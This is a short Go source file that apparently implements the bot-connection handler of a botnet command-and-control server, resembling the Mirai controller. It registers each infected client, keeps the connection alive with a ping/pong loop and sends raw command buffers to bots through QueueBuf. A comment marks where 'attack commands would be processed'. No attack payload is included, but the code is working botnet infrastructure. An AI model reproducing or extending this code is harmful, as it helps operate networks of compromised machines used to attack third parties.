package main

import (
    "fmt"
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        // Increase timeout to 5 minutes
        this.conn.SetDeadline(time.Now().Add(300 * time.Second))
        
        // Read ping from bot
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            fmt.Printf("Bot ping read failed: %v (bytes: %d)\n", err, n)
            return
        }
        
        // Send pong back to bot
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            fmt.Printf("Bot pong write failed: %v (bytes: %d)\n", err, n)
            return
        }
        
        // Optional: Process any commands here
        // This is where attack commands would be processed
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
